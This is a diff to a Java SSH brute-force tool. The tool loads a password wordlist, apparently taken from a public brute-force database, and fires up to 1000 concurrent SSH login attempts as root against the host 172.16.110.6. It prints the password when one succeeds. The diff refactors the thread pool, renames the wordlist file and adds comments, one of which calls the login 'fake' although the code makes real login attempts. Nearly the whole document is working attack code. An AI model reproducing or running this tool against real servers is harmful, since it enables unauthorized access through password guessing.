@@ -38,10 +38,15 @@ import java.util.concurrent.Executors;
 public class SSHBruteForce {
     private static List<String> passwords = new ArrayList<>();
 
+    /**
+     * init password
+     */
     @SneakyThrows
     private static void initPassword() {
         SSHBruteForce sshBruteForce = new SSHBruteForce();
-        String inputFileName = "/ssh/uniqpass-v16.password";
+        // git clone https://github.com/OpenSourceDocs/bruteforce-database
+        // rename any password file to resources/ssh/v16.password
+        String inputFileName = "/ssh/v16.password";
         try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                 sshBruteForce.getClass().getResourceAsStream(inputFileName)))) {
             String line;
@@ -59,26 +64,37 @@ public class SSHBruteForce {
         }
     }
 
+    /**
+     * fake ssh login
+     *
+     * @param password root pass
+     */
     private static void sshLogin(final String password) {
         try {
             Shell shell = new SshByPassword("172.16.110.6", 22, "root", password);
             new Shell.Plain(shell).exec("echo 'Hello, world!'");
-            System.out.println(Thread.currentThread().getName()+" ==> 密码正确：" + password);
+            System.out.println(Thread.currentThread().getName() + " ==> 密码正确：" + password);
             System.out.println("系统退出.");
             System.exit(0);
         } catch (IOException ignored) {
         }
     }
 
-
-    @SneakyThrows
-    public static void main(String[] args) {
-        initPassword();
-        ExecutorService executor = Executors.newFixedThreadPool(1000);
+    /**
+     * start task
+     */
+    private static void start(int poolSize) {
+        ExecutorService executor = Executors.newFixedThreadPool(poolSize >= 1000 ? 1000 : poolSize);
         for (int i = 0; i < passwords.size(); i++) {
             final int index = i;
             executor.submit(() -> sshLogin(passwords.get(index)));
         }
         executor.shutdown();
+    }
+
+
+    public static void main(String[] args) {
+        initPassword();
+        start(passwords.size());
     }
 }
